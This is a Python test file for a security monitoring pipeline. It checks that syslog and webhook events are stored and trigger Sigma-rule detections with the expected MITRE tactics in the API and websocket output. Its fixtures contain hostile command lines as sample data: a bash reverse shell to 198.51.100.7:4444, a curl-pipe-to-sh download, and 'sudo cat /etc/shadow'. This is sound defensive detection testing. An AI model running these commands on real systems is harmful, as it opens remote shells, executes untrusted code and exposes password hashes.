"""End to end, in process: a syslog line and a webhook JSON event are stored as
events and produce detections through the bundled Sigma rules.

Real components: syslog receiver, webhook endpoint, in-memory queue, normalizer
pipeline, event persister, Sigma consumer and alert manager, with a temporary
SQLite database.  Only Valkey (alert deduplication) and OpenSearch are stubbed.
"""

from __future__ import annotations

import json
from collections.abc import AsyncGenerator
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
from httpx import ASGITransport, AsyncClient
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession, async_sessionmaker, create_async_engine

from app.api.v1.endpoints.websocket import manager as ws_manager
from app.connectors.syslog_receiver import SyslogReceiver
from app.core.database import get_db
from app.engine.sigma_engine import SigmaEngine
from app.main import app
from app.models import Base
from app.models.detection import Detection
from app.models.event import Event
from app.pipeline.queue import InMemoryQueue, Topic, get_queue
from app.repositories.connector_repo import ConnectorRepo
from app.services.alert_manager import AlertManager
from app.services.bundled_rules import import_bundled_rules
from app.services.event_persister import event_persister
from app.services.normalizers.pipeline import NormalizerPipeline
from app.services.sigma_consumer import sigma_consumer
from app.services.ws_broadcaster import websocket_broadcaster

SSH_FAILED_ROOT_RULE = "b67d5827-73fd-46a2-a8fd-d15594ac491e"
REVERSE_SHELL_RULE = "ec09518a-b81b-4fe5-9bdf-dd9fc96c01e2"

SYSLOG_LINE = (
    "<38>Feb 19 08:30:00 web01 sshd[2211]: "
    "Failed password for root from 203.0.113.5 port 51122 ssh2"
)
WEBHOOK_EVENT = {
    "timestamp": "2026-01-01T12:00:00Z",
    "host": "app02",
    "user": "www-data",
    "command_line": "bash -c 'bash -i >& /dev/tcp/198.51.100.7/4444 0>&1'",
    "message": "process started",
}
WEBHOOK_HEADERS = {"X-MxTac-Source": "custom-source", "X-MxTac-Token": "a-long-random-token"}


@pytest.fixture
async def pipeline(tmp_path: Path) -> AsyncGenerator[tuple[InMemoryQueue, async_sessionmaker], None]:
    """Queue with the full detection pipeline subscribed, on a temporary database."""
    engine = create_async_engine(f"sqlite+aiosqlite:///{(tmp_path / 'flow.db').as_posix()}")
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
    session_factory = async_sessionmaker(bind=engine, expire_on_commit=False)

    # Startup step 4: bundled rules → rules table → engine.
    sigma_engine = SigmaEngine()
    async with session_factory() as session:
        await import_bundled_rules(session)
        await sigma_engine.load_rules_from_db(session)

    queue = InMemoryQueue()
    await queue.start()
    opensearch = MagicMock(is_available=False)

    with (
        patch("app.core.database.AsyncSessionLocal", session_factory),
        patch("app.services.event_persister.AsyncSessionLocal", session_factory),
        patch("app.services.alert_manager.aioredis") as valkey,
        patch("app.api.v1.endpoints.webhook_ingest.check_webhook_source_rate_limit",
              new=AsyncMock(return_value=True)),
    ):
        valkey.from_url.return_value = AsyncMock(set=AsyncMock(return_value=True))
        await NormalizerPipeline(queue).start()
        await event_persister(queue, opensearch)
        await sigma_consumer(queue, sigma_engine, session_factory=session_factory)
        alert_manager = AlertManager(queue)
        await queue.subscribe(Topic.ALERTS, "alert-manager", alert_manager.process)

        yield queue, session_factory

        await queue.stop()
    await engine.dispose()


async def _rows(session_factory: async_sessionmaker, model: type) -> list:
    async with session_factory() as session:
        return list((await session.execute(select(model))).scalars().all())


async def test_syslog_line_is_stored_and_detected(pipeline) -> None:
    queue, session_factory = pipeline

    receiver = SyslogReceiver(queue, host="127.0.0.1", port=0)
    await receiver._handle_message(SYSLOG_LINE, ("10.0.0.7", 51400))
    await queue.drain(timeout=10)

    events = await _rows(session_factory, Event)
    assert len(events) == 1
    event = events[0]
    assert event.source == "Syslog"
    assert event.hostname == "web01"
    assert event.username == "root"
    assert event.src_ip == "203.0.113.5"
    assert event.class_name == "Authentication"
    assert "Failed password for root" in event.summary

    detections = await _rows(session_factory, Detection)
    assert [d.rule_name for d in detections] == [SSH_FAILED_ROOT_RULE]
    detection = detections[0]
    assert detection.host == "web01"
    assert detection.technique_id == "T1110.001"
    assert detection.tactic_id == "TA0006"
    assert detection.severity == "medium"


async def test_webhook_event_is_stored_and_detected(pipeline) -> None:
    queue, session_factory = pipeline

    async def _override_get_db() -> AsyncGenerator[AsyncSession, None]:
        async with session_factory() as session:
            yield session
            await session.commit()

    async with session_factory() as session:
        await ConnectorRepo.create(
            session,
            name="custom-source",
            connector_type="generic",
            config_json=json.dumps({"webhook_token": "a-long-random-token"}),
        )
        await session.commit()

    app.dependency_overrides[get_db] = _override_get_db
    app.dependency_overrides[get_queue] = lambda: queue
    try:
        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
            resp = await client.post("/api/v1/ingest", json=[WEBHOOK_EVENT], headers=WEBHOOK_HEADERS)
    finally:
        app.dependency_overrides.clear()
    assert resp.status_code == 202
    assert resp.json() == {"accepted": 1, "rejected": 0}
    await queue.drain(timeout=10)

    events = await _rows(session_factory, Event)
    assert len(events) == 1
    event = events[0]
    assert event.source == "Webhook"
    assert event.hostname == "app02"
    assert event.username == "www-data"
    assert event.class_name == "Process Activity"
    assert event.raw["raw"]["command_line"] == WEBHOOK_EVENT["command_line"]

    detections = await _rows(session_factory, Detection)
    assert [d.rule_name for d in detections] == [REVERSE_SHELL_RULE]
    assert detections[0].host == "app02"
    assert detections[0].technique_id == "T1059.004"
    assert detections[0].severity == "high"


async def test_event_that_matches_no_rule_is_stored_without_detection(pipeline) -> None:
    queue, session_factory = pipeline

    receiver = SyslogReceiver(queue, host="127.0.0.1", port=0)
    await receiver._handle_message(
        "<30>Feb 19 08:30:00 web01 systemd[1]: Started Daily apt activities.", ("10.0.0.7", 51400)
    )
    await queue.drain(timeout=10)

    assert len(await _rows(session_factory, Event)) == 1
    assert await _rows(session_factory, Detection) == []


# ── Pipeline detections in the Detections and Overview views ─────────────────

# No timestamp: the events get the time of receipt, inside every Overview range.
_REVERSE_SHELL = {
    "host": "app02", "user": "www-data",
    "command_line": "bash -c 'bash -i >& /dev/tcp/198.51.100.7/4444 0>&1'",
}
_SHADOW_READ = {"host": "db01", "user": "mallory", "command_line": "sudo cat /etc/shadow"}
_DOWNLOAD_TO_SHELL = {"host": "web01", "command_line": "curl http://198.51.100.7/x.sh | sh"}


async def _publish_webhook_events(queue: InMemoryQueue, *events: dict) -> None:
    for event in events:
        await queue.publish(Topic.RAW_WEBHOOK, {**event, "_webhook_source": "custom-source"})
    await queue.drain(timeout=10)


@pytest.fixture
async def api(pipeline, analyst_headers) -> AsyncGenerator[tuple[InMemoryQueue, AsyncClient], None]:
    """HTTP client (analyst) on the database the pipeline writes to."""
    queue, session_factory = pipeline

    async def _override_get_db() -> AsyncGenerator[AsyncSession, None]:
        async with session_factory() as session:
            yield session

    app.dependency_overrides[get_db] = _override_get_db
    try:
        async with AsyncClient(
            transport=ASGITransport(app=app), base_url="http://test", headers=analyst_headers,
        ) as client:
            yield queue, client
    finally:
        app.dependency_overrides.clear()


async def test_pipeline_detection_stores_the_tactic_name(pipeline) -> None:
    queue, session_factory = pipeline
    await _publish_webhook_events(queue, _REVERSE_SHELL, _DOWNLOAD_TO_SHELL)

    detections = {d.host: d for d in await _rows(session_factory, Detection)}
    assert (detections["app02"].tactic, detections["app02"].tactic_id) == ("Execution", "TA0002")
    assert (detections["web01"].tactic, detections["web01"].tactic_id) == (
        "Command and Control", "TA0011",
    )


async def test_pipeline_detections_show_in_overview_tactics(api) -> None:
    queue, client = api
    await _publish_webhook_events(queue, _REVERSE_SHELL, _SHADOW_READ, _DOWNLOAD_TO_SHELL)

    resp = await client.get("/api/v1/overview/tactics")
    assert resp.status_code == 200
    assert {row["tactic"]: row["count"] for row in resp.json()} == {
        "Execution": 1, "Credential Access": 1, "Command and Control": 1,
    }


async def test_pipeline_detections_show_in_overview_heatmap(api) -> None:
    queue, client = api

    resp = await client.get("/api/v1/overview/coverage/heatmap")
    assert all(cell["covered"] == 0 for row in resp.json() for cell in row["cells"])

    await _publish_webhook_events(queue, _REVERSE_SHELL, _SHADOW_READ)

    resp = await client.get("/api/v1/overview/coverage/heatmap")
    assert resp.status_code == 200
    covered = {
        (row["technique_id"], cell["tactic"]): cell["covered"]
        for row in resp.json() for cell in row["cells"] if cell["covered"]
    }
    # T1059.004 under Execution, T1003.008 under Credential Access
    assert covered == {("T1059", "EXEC"): 1, ("T1003", "CRED"): 1}


async def test_pipeline_detection_is_listed_with_all_table_fields(api) -> None:
    queue, client = api
    await _publish_webhook_events(queue, _REVERSE_SHELL, _SHADOW_READ)

    resp = await client.get("/api/v1/detections", params={"tactic": "execution"})
    assert resp.status_code == 200
    (row,) = resp.json()["items"]
    assert row["name"] == "Reverse Shell Command Line"
    assert row["score"] > 0
    assert row["severity"] == "high"
    assert row["technique_id"] == "T1059.004"
    assert row["technique_name"]
    assert row["tactic"] == "Execution"
    assert row["tactic_id"] == "TA0002"
    assert row["host"] == "app02"
    assert row["status"] == "active"
    assert row["time"]

    resp = await client.get("/api/v1/overview/recent-detections")
    assert {d["tactic"] for d in resp.json()} == {"Execution", "Credential Access"}


async def test_pipeline_detection_is_broadcast_to_websocket_clients(pipeline) -> None:
    queue, _ = pipeline
    with patch.object(ws_manager, "broadcast", new=AsyncMock()) as broadcast:
        await websocket_broadcaster(queue)
        await _publish_webhook_events(queue, _REVERSE_SHELL)

    broadcast.assert_awaited_once()
    message = broadcast.await_args.args[0]
    assert message["type"] == "alert"
    assert message["data"]["rule_title"] == "Reverse Shell Command Line"
    assert message["data"]["host"] == "app02"
    assert message["data"]["level"] == "high"
    assert message["data"]["technique_ids"] == ["T1059.004"]
    assert message["data"]["tactic_ids"] == ["TA0002"]
    assert message["data"]["score"] > 0
